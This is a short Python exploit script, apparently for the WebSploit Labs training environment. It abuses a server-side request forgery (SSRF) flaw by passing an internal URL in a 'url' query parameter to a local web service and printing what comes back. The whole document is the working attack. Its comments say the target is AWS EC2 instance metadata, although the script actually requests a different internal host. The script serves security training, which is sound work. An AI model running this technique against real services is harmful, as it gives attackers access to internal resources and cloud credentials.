'''
Script to exploit the SSRF in the WebSploit Labs Galatic Archives container.
Author: Omar Santos @santosomar
'''

import requests

# The URL of the vulnerable web service.
vulnerable_url = 'http://127.0.0.1:5000'

# The internal URL that the attacker wants to access.
# AWS EC2 instances use this URL to provide instance metadata.
# This data should be inaccessible from outside the EC2 instance.
internal_url = 'https://internal.secretcorp.org/secret.txt'

# The attacker constructs the exploit URL by appending the internal URL
# as a query parameter to the vulnerable service's URL.
exploit_url = vulnerable_url + '?url=' + internal_url

# The attacker sends a request to the exploit URL.
response = requests.get(exploit_url)

# If the vulnerable server is running inside an AWS EC2 instance, it
# will return the instance metadata.
print(response.text)
